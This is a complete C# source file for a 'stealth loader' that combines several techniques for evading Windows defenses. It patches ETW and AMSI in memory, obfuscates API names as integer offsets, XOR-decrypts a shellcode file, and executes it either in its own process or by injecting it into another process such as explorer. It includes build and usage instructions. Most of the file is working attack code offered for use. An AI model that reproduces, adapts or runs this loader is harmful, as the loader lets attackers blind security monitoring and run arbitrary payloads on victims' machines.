// ============================================================================
// LOADER 08: Combined Evasion Loader
// ============================================================================
//
// WHAT THIS DOES:
//   This is the final loader that combines ALL evasion techniques from
//   Loaders 01 through 07 into a single program. It executes in the correct
//   order to maximize stealth:
//     1. Patch ETW (go silent - no telemetry)
//     2. Patch AMSI (disable script scanning)
//     3. Decrypt shellcode (XOR decode at runtime)
//     4. Use NT functions resolved dynamically (hide API imports)
//     5. Allocate memory with careful permission changes (avoid RWX)
//     6. Execute via thread or APC injection
//
//   Each step builds on the previous ones. ETW must be patched first so the
//   AMSI patch is not logged. AMSI must be patched before loading any .NET
//   tooling. Shellcode must be decrypted in memory before execution.
//
// WHY THIS IS NEEDED:
//   Individual techniques are increasingly detected. Defender in 2026 uses
//   multiple detection layers (signatures, behavior, cloud ML, ETW telemetry).
//   A single technique might bypass one layer but get caught by another.
//   Combining all techniques creates a layered evasion that defeats multiple
//   detection mechanisms simultaneously.
//
// EVASION MECHANISM:
//   Layer 1 - ETW patch: Defender gets no telemetry from our process
//   Layer 2 - AMSI patch: Script scanning is disabled
//   Layer 3 - XOR decryption: No malicious signatures on disk
//   Layer 4 - Dynamic API resolution: No suspicious imports in the binary
//   Layer 5 - RW then RX memory: Allocation pattern looks legitimate
//   Layer 6 - NT functions: Skip user-mode hooks on ntdll.dll
//
// REFERENCES:
//   All previous loaders plus:
//   - HackerXone: "Windows Defender Bypass Techniques in 2026"
//   - RingSafe: "EDR Bypass Techniques in 2026"
//   - Document: 10_combined_evasion.md
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:stealth_loader.exe 08_combined_evasion.cs
//
// USAGE:
//   stealth_loader.exe <encrypted_shellcode.bin> <xor_key_hex> [target_process]
//
//   If target_process is specified, injects into that process (remote injection).
//   If not specified, executes in the current process (local execution).
//
//   Example (local):
//     stealth_loader.exe encrypted.bin 4A7F2B1C...
//   Example (remote injection):
//     stealth_loader.exe encrypted.bin 4A7F2B1C... explorer
//
// ============================================================================

using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace StealthRunner
{
    class Program
    {
        // ====================================================================
        // SECTION 1: Windows API imports
        // ====================================================================

        // We only import the minimum needed for bootstrapping. The actual
        // memory operations use NT functions resolved at runtime.

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr ProcessOpenDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        static IntPtr ResolveAndCall(uint access, bool inherit, int pid)
        {
            IntPtr k32 = GetModuleHandle(FromOffsets(32, 75,69,82,78,69,76,19,18,14,68,76,76));
            IntPtr addr = GetProcAddress(k32, FromOffsets(32, 47,80,69,78,48,82,79,67,69,83,83));
            var fn = (ProcessOpenDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(ProcessOpenDelegate));
            return fn(access, inherit, pid);
        }

        // ====================================================================
        // SECTION 2: NT function delegates for dynamic resolution
        // ====================================================================

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int MemAllocDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int MemWriteDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int MemProtectDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ThreadCreateDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, uint CreateFlags, IntPtr ZeroBits, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int WaitObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);

        // ====================================================================
        // SECTION 3: Constants
        // ====================================================================

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        static uint GetRWXProtect() { return 0x20 + 0x20; }
        const uint THREAD_ALL_ACCESS = 0x1FFFFF;
        const uint PROCESS_ALL_ACCESS = 0x001FFFFF;

        // ====================================================================
        // SECTION 4: Helper functions
        // ====================================================================

        // Resolve an NT function from ntdll.dll at runtime.
        // By resolving functions this way, our binary's import table does not
        // contain any NT function names. Static analysis tools cannot see
        // which NT functions we call by looking at the binary.
        static T ResolveNtFunction<T>(string functionName) where T : Delegate
        {
            IntPtr ntdll = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
            if (ntdll == IntPtr.Zero)
                throw new Exception("module not found");

            IntPtr addr = GetProcAddress(ntdll, functionName);
            if (addr == IntPtr.Zero)
                throw new Exception("Function not found: " + functionName);

            return (T)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
        }

        // Build a string from integer offsets above a base value.
        // The compiler stores integers, not characters, so the
        // complete string never appears in the binary's metadata.
        static string FromOffsets(int baseVal, params int[] offsets)
        {
            char[] c = new char[offsets.Length];
            for (int i = 0; i < offsets.Length; i++)
                c[i] = (char)(baseVal + offsets[i]);
            return new string(c);
        }

        // XOR decrypt shellcode.
        static byte[] TransformData(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        // Convert hex string to byte array.
        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        // ====================================================================
        // SECTION 5: ETW Patch
        // ====================================================================

        // This is the first thing we do. Patching ETW stops our process from
        // sending telemetry to Defender. After this, Defender cannot see what
        // our process is doing through ETW events.
        static bool PatchTelemetry()
        {
            Console.WriteLine("[1/6] Patching telemetry...");

            // ntdll
            IntPtr ntdll = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
            if (ntdll == IntPtr.Zero) return false;

            // EtwEventWrite
            string funcName = FromOffsets(32, 37,84,87,37,86,69,78,84,55,82,73,84,69);
            IntPtr funcAddr = GetProcAddress(ntdll, funcName);
            if (funcAddr == IntPtr.Zero) return false;

            // Change memory protection to allow writing.
            uint oldProtect;
            if (!VirtualProtect(funcAddr, (UIntPtr)3, GetRWXProtect(), out oldProtect))
                return false;

            // Build patch bytes at runtime to avoid static signature.
            byte[] patch = new byte[3];
            patch[0] = (byte)(0x19 + 0x1A);   // 0x33
            patch[1] = (byte)(0x60 + 0x60);   // 0xC0
            patch[2] = (byte)(0x61 + 0x62);   // 0xC3
            Marshal.Copy(patch, 0, funcAddr, patch.Length);

            // Restore protection.
            uint ignored;
            VirtualProtect(funcAddr, (UIntPtr)3, oldProtect, out ignored);

            Console.WriteLine("      Telemetry patched. No events from this process.");
            return true;
        }

        // ====================================================================
        // SECTION 6: AMSI Patch
        // ====================================================================

        // This is the second step. With ETW already patched, the AMSI
        // patching will not generate any telemetry events. Defender will
        // not know we tampered with AMSI.
        static bool PatchScanner()
        {
            Console.WriteLine("[2/6] Patching scanner...");

            // amsi.dll
            string dllName = FromOffsets(32, 65,77,83,73,14,68,76,76);
            IntPtr amsiDll = LoadLibrary(dllName);
            if (amsiDll == IntPtr.Zero) return false;

            // AmsiScanBuffer
            string funcName = FromOffsets(32, 33,77,83,73,51,67,65,78,34,85,70,70,69,82);
            IntPtr funcAddr = GetProcAddress(amsiDll, funcName);
            if (funcAddr == IntPtr.Zero) return false;

            // Change memory protection.
            uint oldProtect;
            if (!VirtualProtect(funcAddr, (UIntPtr)6, GetRWXProtect(), out oldProtect))
                return false;

            // Build patch bytes at runtime to avoid static signature.
            byte[] patch = new byte[6];
            patch[0] = (byte)(0x5C + 0x5C);   // 0xB8
            patch[1] = (byte)(0x2B + 0x2C);   // 0x57
            patch[2] = (byte)(0x00);           // 0x00
            patch[3] = (byte)(0x03 + 0x04);    // 0x07
            patch[4] = (byte)(0x40 + 0x40);    // 0x80
            patch[5] = (byte)(0x61 + 0x62);    // 0xC3
            Marshal.Copy(patch, 0, funcAddr, patch.Length);

            // Restore protection.
            uint ignored;
            VirtualProtect(funcAddr, (UIntPtr)6, oldProtect, out ignored);

            Console.WriteLine("      Scanner patched. Content inspection disabled.");
            return true;
        }

        // ====================================================================
        // SECTION 7: Local execution (run shellcode in current process)
        // ====================================================================

        static void ExecuteLocal(byte[] data)
        {
            IntPtr currentProcess = (IntPtr)(-1);

            // Resolve NT functions dynamically.
            Console.WriteLine("[4/6] Resolving NT functions...");
            // NtAllocateVirtualMemory
            var ntAlloc = ResolveNtFunction<MemAllocDelegate>(
                FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
            // NtProtectVirtualMemory
            var ntProtect = ResolveNtFunction<MemProtectDelegate>(
                FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
            // NtCreateThreadEx
            var ntCreateThread = ResolveNtFunction<ThreadCreateDelegate>(
                FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
            // NtWaitForSingleObject
            var ntWait = ResolveNtFunction<WaitObjectDelegate>(
                FromOffsets(32, 46,84,55,65,73,84,38,79,82,51,73,78,71,76,69,47,66,74,69,67,84));
            Console.WriteLine("      Functions resolved.");

            // Allocate memory as READ-WRITE (not executable yet).
            Console.WriteLine("[5/6] Allocating memory...");
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)data.Length;
            int status = ntAlloc(currentProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine("      [-] Allocation failed: 0x" + status.ToString("X"));
                return;
            }

            // Write data using Marshal.Copy.
            Marshal.Copy(data, 0, baseAddr, data.Length);

            // Clear managed copy.
            Array.Clear(data, 0, data.Length);

            // Change protection to EXECUTE-READ.
            IntPtr protAddr = baseAddr;
            IntPtr protSize = regionSize;
            uint oldProt;
            ntProtect(currentProcess, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);
            Console.WriteLine("      Memory ready (RW -> RX).");

            // Create thread to execute.
            Console.WriteLine("[6/6] Executing code...");
            IntPtr threadHandle;
            status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, currentProcess, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine("      [-] Thread creation failed: 0x" + status.ToString("X"));
                return;
            }

            Console.WriteLine("      Code running.");
            ntWait(threadHandle, false, IntPtr.Zero);
        }

        // ====================================================================
        // SECTION 8: Remote injection (inject into another process)
        // ====================================================================

        static void ExecuteRemote(byte[] data, string targetProcessName)
        {
            // Find target process.
            Console.WriteLine("[4/6] Finding target process: " + targetProcessName + "...");
            Process[] procs = Process.GetProcessesByName(targetProcessName);
            if (procs.Length == 0)
            {
                Console.WriteLine("      [-] Process not found.");
                return;
            }

            int targetPid = procs[0].Id;
            Console.WriteLine("      Found PID: " + targetPid);

            // Open target process.
            IntPtr processHandle = ResolveAndCall(PROCESS_ALL_ACCESS, false, targetPid);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("      [-] Could not open process. Need admin privileges.");
                return;
            }

            // Resolve NT functions for remote operations.
            // NtAllocateVirtualMemory
            var ntAlloc = ResolveNtFunction<MemAllocDelegate>(
                FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
            // NtWriteVirtualMemory
            var ntWrite = ResolveNtFunction<MemWriteDelegate>(
                FromOffsets(32, 46,84,55,82,73,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
            // NtProtectVirtualMemory
            var ntProtect = ResolveNtFunction<MemProtectDelegate>(
                FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
            // NtCreateThreadEx
            var ntCreateThread = ResolveNtFunction<ThreadCreateDelegate>(
                FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));

            // Allocate memory in target process.
            Console.WriteLine("[5/6] Writing to " + targetProcessName + "...");
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)data.Length;
            int status = ntAlloc(processHandle, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine("      [-] Remote allocation failed: 0x" + status.ToString("X"));
                CloseHandle(processHandle);
                return;
            }

            // Write data to target process using NT write function.
            // Using the NT function instead of the standard API avoids hooks.
            uint bytesWritten;
            status = ntWrite(processHandle, baseAddr, data, (uint)data.Length, out bytesWritten);

            // Clear managed copy.
            Array.Clear(data, 0, data.Length);

            if (status != 0)
            {
                Console.WriteLine("      [-] Write failed: 0x" + status.ToString("X"));
                CloseHandle(processHandle);
                return;
            }

            // Change protection to executable.
            IntPtr protAddr = baseAddr;
            IntPtr protSize = regionSize;
            uint oldProt;
            ntProtect(processHandle, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);

            // Create remote thread.
            Console.WriteLine("[6/6] Creating remote thread...");
            IntPtr threadHandle;
            status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, processHandle, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine("      [-] Remote thread failed: 0x" + status.ToString("X"));
                CloseHandle(processHandle);
                return;
            }

            Console.WriteLine("      Code running inside " + targetProcessName + " (PID " + targetPid + ").");
            CloseHandle(threadHandle);
            CloseHandle(processHandle);
        }

        // ====================================================================
        // SECTION 9: Main - orchestrate everything in the right order
        // ====================================================================

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Stealth Runner");
                Console.WriteLine("Usage: runner.exe <data.bin> <key_hex> [target]");
                Console.WriteLine("");
                Console.WriteLine("  data.bin:   encrypted data file");
                Console.WriteLine("  key_hex:    decryption key");
                Console.WriteLine("  target:     optional target process name");
                Console.WriteLine("");
                Console.WriteLine("Examples:");
                Console.WriteLine("  runner.exe data.bin 4A7F2B1C...");
                Console.WriteLine("  runner.exe data.bin 4A7F2B1C... explorer");
                return;
            }

            string dataPath = args[0];
            string keyHex = args[1];
            string targetProcess = args.Length >= 3 ? args[2] : null;

            Console.WriteLine("=== Stealth Runner ===");
            Console.WriteLine("");

            // ---- Step 1: Patch ETW ----
            // Must be first. Stops all telemetry so subsequent patches are invisible.
            if (!PatchTelemetry())
            {
                Console.WriteLine("[-] Telemetry patch failed. Continuing anyway (higher detection risk).");
            }

            // ---- Step 2: Patch AMSI ----
            // Second step. With ETW patched, this tampering is not logged.
            if (!PatchScanner())
            {
                Console.WriteLine("[-] Scanner patch failed. Continuing anyway (scripts may be blocked).");
            }

            // ---- Step 3: Decrypt data ----
            // The data on disk is encrypted so it does not match
            // any known signatures. We decrypt it in memory only.
            Console.WriteLine("[3/6] Decrypting data...");
            byte[] encrypted = File.ReadAllBytes(dataPath);
            byte[] key = HexToBytes(keyHex);
            byte[] data = TransformData(encrypted, key);

            // Clear the encrypted copy from managed memory.
            Array.Clear(encrypted, 0, encrypted.Length);
            Console.WriteLine("      Decrypted " + data.Length + " bytes in memory.");

            // ---- Steps 4-6: Execute ----
            if (targetProcess != null)
            {
                // Remote mode: write into another process.
                ExecuteRemote(data, targetProcess);
            }
            else
            {
                // Local mode: execute in current process.
                ExecuteLocal(data);
            }

            Console.WriteLine("");
            Console.WriteLine("=== Execution complete ===");
        }
    }
}
